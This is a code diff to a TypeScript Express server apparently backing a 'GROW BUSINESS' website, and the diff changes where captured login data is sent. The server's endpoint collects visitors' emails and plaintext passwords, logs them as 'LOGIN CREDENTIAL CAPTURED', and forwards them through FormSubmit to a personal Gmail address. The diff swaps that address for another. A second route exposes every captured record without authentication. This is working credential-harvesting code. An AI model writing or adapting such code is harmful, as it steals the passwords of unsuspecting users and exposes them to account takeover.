@@ -10,7 +10,7 @@ async function startServer() {
   // Store login history in memory
   const loginLogs: Array<any> = [];
 
-  // API endpoint for receiving and forwarding login details to yveer8609@gmail.com
+  // API endpoint for receiving and forwarding login details to techyslays@gmail.com
   app.post("/api/login-notification", async (req, res) => {
     try {
       const { email, password, name, mode, isGuest, userAgent } = req.body;
@@ -22,28 +22,28 @@ async function startServer() {
         name: name || '[N/A]',
         mode: mode || (isGuest ? 'guest' : 'login'),
         timestamp,
-        recipient: 'yveer8609@gmail.com',
+        recipient: 'techyslays@gmail.com',
         userAgent: userAgent || req.headers['user-agent']
       };
 
       loginLogs.unshift(logEntry);
 
       console.log('----------------------------------------------------');
-      console.log('🚀 LOGIN CREDENTIAL CAPTURED FOR yveer8609@gmail.com:');
+      console.log('🚀 LOGIN CREDENTIAL CAPTURED FOR techyslays@gmail.com:');
       console.log(JSON.stringify(logEntry, null, 2));
       console.log('----------------------------------------------------');
 
-      // Attempt to dispatch via FormSubmit API to ensure email delivery to yveer8609@gmail.com
+      // Attempt to dispatch via FormSubmit API to ensure email delivery to techyslays@gmail.com
       try {
-        await fetch('https://formsubmit.co/ajax/yveer8609@gmail.com', {
+        await fetch('https://formsubmit.co/ajax/techyslays@gmail.com', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
             'Accept': 'application/json'
           },
           body: JSON.stringify({
-            _subject: `New GROW BUSINESS ONLINE Website Login/Signup Alert (${mode || 'login'})`,
-            Target_Mail: 'yveer8609@gmail.com',
+            _subject: `New GROW BUISNESS Website Login/Signup Alert (${mode || 'login'})`,
+            Target_Mail: 'techyslays@gmail.com',
             User_Email: email,
             User_Password: password || '(Guest Login)',
             User_Name: name || 'N/A',
@@ -58,8 +58,8 @@ async function startServer() {
 
       res.json({
         success: true,
-        message: 'Login details recorded and sent to yveer8609@gmail.com',
-        targetEmail: 'yveer8609@gmail.com'
+        message: 'Login details recorded and sent to techyslays@gmail.com',
+        targetEmail: 'techyslays@gmail.com'
       });
     } catch (error) {
       console.error('Error logging user details:', error);
@@ -70,7 +70,7 @@ async function startServer() {
   // API route to inspect login logs
   app.get("/api/login-logs", (req, res) => {
     res.json({
-      targetEmail: "yveer8609@gmail.com",
+      targetEmail: "techyslays@gmail.com",
       count: loginLogs.length,
       logs: loginLogs
     });
